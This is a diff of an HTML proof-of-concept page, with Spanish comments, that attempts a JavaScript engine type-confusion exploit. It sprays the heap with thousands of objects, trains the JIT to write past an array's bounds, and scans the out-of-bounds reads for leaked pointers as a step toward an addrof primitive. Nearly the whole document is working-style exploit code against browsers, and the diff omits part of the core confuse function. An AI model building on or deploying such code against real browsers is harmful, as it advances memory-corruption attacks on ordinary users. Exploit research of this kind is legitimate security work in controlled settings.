@@ -1,22 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>PoC Mejorado: Escaneo heap</title>
-</head>
+<head><title>PoC Type Confusion + Heap Spray</title></head>
 <body>
-  <h1>PoC: Escaneo para encontrar addrof</h1>
+  <h1>PoC Type Confusion + Heap Spray</h1>
   <pre id="log"></pre>
   <script>
     const log = (msg) => document.getElementById("log").textContent += msg + "\n";
 
     let float_arr;
-    let obj_arr;
     let oob;
+    let objs = [];
+
+    function hex(f) {
+      let buf = new ArrayBuffer(8);
+      let f64 = new Float64Array(buf);
+      let u64 = new BigUint64Array(buf);
+      f64[0] = f;
+      return "0x" + u64[0].toString(16);
+    }
 
     function setup() {
-      float_arr = new Array(100).fill(1.1);
-      obj_arr = [{}, {a: 13.37}, {b: 42}];
-      // Entrenamos el JIT
+      // Preparar spray de objetos
+      for (let i = 0; i < 10000; i++) {
+        objs.push({a: 13.37, b: i});
+      }
+
+      float_arr = [1.1, 2.2, 3.3];
+
       function confuse(arr, index, val) {
         for (let i = 0; i < 10000; i++) {
           arr[0] = 1.1;
@@ -25,27 +35,25 @@
         return arr;
       }
 
-      // Esto debe provocar la expansión ilegal del array
-      oob = confuse(float_arr, 150, 13.37);
+      oob = confuse(float_arr, 10, 13.37);
     }
 
-    function dumpArray() {
-      log("=== Dump extendido del array ===");
-      for (let i = 0; i < 200; i++) {
+    function scan() {
+      log("=== Escaneo OOB ===");
+      for (let i = 0; i < 100; i++) {
         try {
           let v = oob[i];
-          if (v !== 1.1 && typeof v === 'number') {
-            log(`oob[${i}] = ${v}`);
+          if (typeof v === "number" && v !== 1.1 && v !== 2.2 && v !== 3.3 && v !== 13.37) {
+            log(`oob[${i}] = ${v} → posible ptr: ${hex(v)}`);
           }
         } catch (e) {
-          log(`oob[${i}] = [EXCEPTION]`);
+          log(`oob[${i}] = [EXC]`);
         }
       }
     }
 
     setup();
-    obj_arr[0] = {leak: true};
-    dumpArray();
+    scan();
   </script>
 </body>
 </html>
